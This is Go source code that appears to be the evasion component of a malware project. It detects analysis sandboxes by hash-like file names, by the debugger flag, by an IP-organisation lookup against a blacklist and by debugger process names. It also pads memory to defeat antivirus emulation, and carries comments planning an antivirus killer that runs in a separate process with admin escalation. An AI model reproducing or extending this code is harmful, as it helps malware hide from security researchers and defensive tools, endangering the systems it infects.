//Work on Active Scanning (use channels )

//Macro Analysis
//The first in the series of new checks in the macro looks at the Microsoft Word filename itself.
//It checks whether the filename contains only hexadecimal characters (from the set of “0123456789ABCDEFabcdef”) before the extension, and if it does, the macro does not proceed to infect the victim.
//This is a common occurrence with files submitted to sandboxes, which often use SHA256 or MD5 hash as the filename, which only contain hexadecimal characters.
//If any other characters, such as other letters after “f”, underscores, or spaces are present, this check succeeds and the macro continues.
//In addition, filenames need to have a “.”, followed by any extension.

//Check for number of running processes (Less then 50 = VM?)

//AV Killer to make a clone and run with command, ask for Admin if needed
//AV Killer must use seperate process to prevent any AV from knowing who really did it.

//ReWork Memory Allocation to Random

package components

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

var magicNumber int64 = 0

//============================================================
//                   Anti-Debug
//============================================================
func detect() bool {
	if detectName() || detectBasic() || detectIP() || detectDebugProc() {
		return true
	}
	return false
}

func detectName() bool { //Check the file name, See if its a HASH
	match, _ := regexp.MatchString("[a-f0-9]{32}", os.Args[0])
	return match
}

func detectBasic() bool { //Basic Flag
	Flag, _, _ := procIsDebuggerPresent.Call()
	if Flag != 0 {
		return true
	}
	return false
}

func detectIP() bool { //IP Organization Association
	var client = new(http.Client)
	q, _ := http.NewRequest("GET", maxMind, nil)
	q.Header.Set("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
	q.Header.Set("Referer", deobfuscate(`iuuqt;00xxx/nbynjoe/dpn0fo0mpdbuf.nz.jq.beesftt`))
	r, _ := client.Do(q)
	if r.StatusCode == 200 {
		defer r.Body.Close()
		buf, err := ioutil.ReadAll(r.Body)
		if err != nil {
			return false
		}
		var pro mMind
		err = json.NewDecoder(strings.NewReader(string(bytes.TrimSpace(buf)))).Decode(&pro)
		if err != nil {
			return false
		}
		for i := 0; i < len(organizationBlacklist); i++ {
			if strings.Contains(strings.ToUpper(pro.Traits.Organization), strings.ToUpper(organizationBlacklist[i])) {
				return true
			}
		}
	}
	return false
}

func detectDebugProc() bool { //Process Detection
	for i := 0; i < len(debugBlacklist); i++ {
		if checkForProc(debugBlacklist[i]) {
			return true
		}
	}
	return false
}

//============================================================
//                   Anti-Virus Killer
//============================================================
func avKiller() {
	for isAVKilling {
		time.Sleep(time.Duration(randInt(500, 1000)) * time.Millisecond)

	}
}

//============================================================
//                   Anti-Process
//============================================================
func antiProc() {
	for {
		time.Sleep(time.Duration(randInt(500, 1000)) * time.Millisecond)
		//Scan for Blacklisted Proc
		//Ig found attempt to kill it
	}
}

//============================================================
//                   Anti-Virus Bypass
//============================================================
func bypassAV() {
	if antiVirusBypass == true {
		allocateMemory()
		jump()
	}
}

func allocateMemory() {
	for i := 0; i < 1000; i++ {
		var Size int = 30000000
		Buffer_1 := make([]byte, Size)
		Buffer_1[0] = 1
		var Buffer_2 [102400000]byte
		Buffer_2[0] = 0
	}
}

func jump() {
	magicNumber++
	hop1()
}

func hop1() {
	magicNumber++
	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
	hop2()
}
func hop2() {
	magicNumber++
	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
	hop3()
}
func hop3() {
	magicNumber++
	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
	hop4()
}
func hop4() {
	magicNumber++
	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
	hop5()
}
func hop5() {
	magicNumber++
	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
	hop6()
}
func hop6() {
	magicNumber++
	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
	hop7()
}
func hop7() {
	magicNumber++
	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
	hop8()
}
func hop8() {
	magicNumber++
	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
	hop9()
}
func hop9() {
	magicNumber++
	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
	hop10()
}
func hop10() {
	magicNumber++
}
